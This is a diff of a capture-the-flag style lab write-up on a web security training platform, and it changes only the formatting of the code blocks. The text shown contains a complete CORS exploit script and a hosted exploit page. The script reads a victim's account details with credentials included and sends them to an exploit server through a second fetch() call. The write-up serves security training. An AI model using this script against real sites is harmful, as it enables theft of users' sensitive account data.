@@ -99,7 +99,7 @@ The exploit uses JavaScript fetch() to request the sensitive endpoint and then s
 
 Example exploit script:
 
-<script>
+``<script>
 fetch("https://LAB-ID.web-security-academy.net/accountDetails", {
     credentials: "include"
 })
@@ -109,7 +109,7 @@ fetch("https://LAB-ID.web-security-academy.net/accountDetails", {
 .then(function(data){
     fetch("https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?data=" + encodeURIComponent(data));
 });
-</script>
+</script>``
 Explanation:
 
 fetch() → sends request to vulnerable endpoint
@@ -119,11 +119,9 @@ second fetch() → sends stolen data to attacker server
 Full Exploit Page
 The exploit page that should be hosted on the exploit server:
 
-<html>
+#<html>
 <body>
-
 <script>
-
 fetch("https://LAB-ID.web-security-academy.net/accountDetails", {
     credentials: "include"
 })
@@ -133,11 +131,10 @@ fetch("https://LAB-ID.web-security-academy.net/accountDetails", {
 .then(function(data){
     fetch("https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?data=" + encodeURIComponent(data));
 });
-
 </script>
-
 </body>
-</html>
+#</html>
+
 Delivering the Attack
 Steps to complete the attack:
 
